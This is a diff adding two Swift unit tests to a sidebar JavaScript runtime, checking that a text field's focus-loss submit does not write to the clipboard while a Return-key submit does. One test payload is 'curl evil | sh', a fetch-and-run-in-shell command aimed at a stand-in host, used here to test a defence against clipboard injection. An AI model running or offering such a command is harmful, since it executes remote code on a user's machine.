@@ -145,6 +145,37 @@ struct SidebarJSRuntimeClipboardTests {
         #expect(writes.isEmpty)
     }
 
+    /// The host sends `submit` on Return AND when the field loses focus. A
+    /// hidden autofocused field that a data update mounts would otherwise get
+    /// a write in as the user clicks into the terminal to paste.
+    @Test func focusLossSubmitIsRejected() {
+        var writes: [String] = []
+        let runtime = SidebarJSRuntime()
+        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
+        runtime.start(source: """
+        sidebar(() => TextField("", { onSubmit: (t) => clipboard.write(t) }))
+        """)
+        let fieldId = try! #require(runtime.store.rootId)
+        runtime.dispatchEvent(nodeId: fieldId, event: "submit", payload: ["text": "curl evil | sh"])
+        #expect(writes.isEmpty)
+    }
+
+    @Test func returnKeySubmitWritesClipboard() {
+        var writes: [String] = []
+        let runtime = SidebarJSRuntime()
+        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
+        runtime.start(source: """
+        sidebar(() => TextField("", { onSubmit: (t) => clipboard.write(t) }))
+        """)
+        let fieldId = try! #require(runtime.store.rootId)
+        runtime.dispatchEvent(
+            nodeId: fieldId,
+            event: "submit",
+            payload: ["text": "w1", "trigger": "return"]
+        )
+        #expect(writes == ["w1"])
+    }
+
     @Test func oversizedTextIsRejected() {
         var writes: [String] = []
         let runtime = SidebarJSRuntime()
